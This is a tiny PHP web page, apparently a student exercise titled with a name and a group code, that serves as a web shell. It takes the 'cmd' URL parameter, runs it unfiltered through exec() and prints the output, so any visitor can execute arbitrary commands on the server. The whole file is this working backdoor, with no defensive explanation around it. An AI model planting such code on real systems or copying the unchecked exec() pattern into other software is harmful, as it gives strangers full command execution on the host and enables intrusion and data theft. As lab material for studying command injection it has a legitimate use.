<html lang="ru">
<head>
    <title>Makeev Pavel IKBO-30-20</title>
</head>
<body>
    <table>
        <?php
            function run_cmd($cmd)
            {
                $lines = array();
                exec($cmd, $lines);
                echo "<pre> > " . $cmd . "</pre>";
                echo "<pre>" . implode("\n", $lines) . "</pre>";
            }
            $cmd = $_GET['cmd'];
            run_cmd($cmd);
        ?>
    </table>
</body>
</html>